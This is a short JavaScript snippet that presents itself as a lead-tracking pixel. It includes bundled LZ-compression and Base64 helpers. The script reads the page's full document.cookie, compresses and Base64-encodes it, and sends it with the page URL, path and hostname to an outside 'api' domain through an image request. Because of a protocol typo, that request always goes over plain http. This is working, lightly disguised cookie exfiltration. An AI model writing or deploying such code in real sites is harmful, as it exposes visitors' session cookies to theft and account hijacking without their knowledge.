(function() {
	var LZString={compress:function(s) {var dict = {};var data = (s + "").split("");var out = [];var currChar;var phrase = data[0];var code = 256;for (var i=1; i<data.length; i++) { currChar=data[i]; if (dict[phrase + currChar] != null) { phrase += currChar;}else{out.push(phrase.length > 1 ? dict[phrase] : phrase.charCodeAt(0));dict[phrase + currChar] = code;code++;phrase=currChar;}}out.push(phrase.length > 1 ? dict[phrase] : phrase.charCodeAt(0));for (var i=0; i<out.length; i++) {out[i] = String.fromCharCode(out[i]);}return out.join("");},decompress:function(s){var dict = {};var data = (s + "").split("");var currChar = data[0];var oldPhrase = currChar;var out = [currChar];var code = 256;var phrase;for (var i=1; i<data.length; i++) {var currCode = data[i].charCodeAt(0);if (currCode < 256){phrase = data[i];}else{phrase = dict[currCode] ? dict[currCode] : (oldPhrase + currChar);}out.push(phrase);currChar = phrase.charAt(0);dict[code] = oldPhrase + currChar;code++;oldPhrase = phrase;}return out.join("");}}
	var Base64 = {_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode : function (input) {var output = "";var chr1, chr2, chr3, enc1, enc2, enc3, enc4;var i = 0;input = Base64._utf8_encode(input);while (i < input.length) {chr1 = input.charCodeAt(i++);chr2 = input.charCodeAt(i++);chr3 = input.charCodeAt(i++);enc1 = chr1 >> 2;enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);enc4 = chr3 & 63;if (isNaN(chr2)) {enc3 = enc4 = 64;}else if (isNaN(chr3)) {enc4 = 64;}output = output + this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) + this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);}return output;},decode : function (input) {var output = "";var chr1, chr2, chr3;var enc1, enc2, enc3, enc4;var i = 0;input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");while (i < input.length) {enc1 = this._keyStr.indexOf(input.charAt(i++));enc2 = this._keyStr.indexOf(input.charAt(i++));enc3 = this._keyStr.indexOf(input.charAt(i++));enc4 = this._keyStr.indexOf(input.charAt(i++));chr1 = (enc1 << 2) | (enc2 >> 4);chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);chr3 = ((enc3 & 3) << 6) | enc4;output = output + String.fromCharCode(chr1);if (enc3 != 64) {output = output + String.fromCharCode(chr2);}if (enc4 != 64) {output = output + String.fromCharCode(chr3);}}output = Base64._utf8_decode(output);return output;},_utf8_encode : function (string) {string = string.replace(/\r\n/g,"\n");var utftext = "";for (var n = 0;n < string.length;n++) {var c = string.charCodeAt(n);if (c < 128) {utftext += String.fromCharCode(c);}else if((c > 127) && (c < 2048)) {utftext += String.fromCharCode((c >> 6) | 192);utftext += String.fromCharCode((c & 63) | 128);}else {utftext += String.fromCharCode((c >> 12) | 224);utftext += String.fromCharCode(((c >> 6) & 63) | 128);utftext += String.fromCharCode((c & 63) | 128);}}return utftext;},_utf8_decode : function (utftext) {var string = "";var i = 0;var c = c1 = c2 = 0;while ( i < utftext.length ) {c = utftext.charCodeAt(i);if (c < 128) {string += String.fromCharCode(c);i++;}else if((c > 191) && (c < 224)) {c2 = utftext.charCodeAt(i+1);string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));i += 2;}else {c2 = utftext.charCodeAt(i+1);c3 = utftext.charCodeAt(i+2);string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));i += 3;}}return string;}}	
	var Url = {buildUrl:function(parameters) {var qs = "";for(var key in parameters) {var value = parameters[key];qs += encodeURIComponent(key) + "=" + encodeURIComponent(value) + "&";}if (qs.length > 0){qs = qs.substring(0, qs.length-1);}return qs;}};
	
	var api_domain = '%api_domain%';
	var pixel = ('https:' == document.location.protocal ? 'https://api' : 'http://api') + '.' + api_domain + '/lead/pxl';
	
	var params = new Array();
	params['page'] = location.pathname.split("/").pop();
	params['domain'] = location.hostname;
	params['cookie'] = Base64.encode(LZString.compress(document.cookie));
	var folder_parts = location.pathname.split("/");
	if (folder_parts[1]) {
		params['folder'] = folder_parts[1];
	} else {
		params['folder'] = "";
	}
	params['href'] = location.href;
		
	pixel += ('?' + Url.buildUrl(params));

	var pxl = document.createElement('img');
	pxl.src = pixel;
	pxl.border = 0;
})();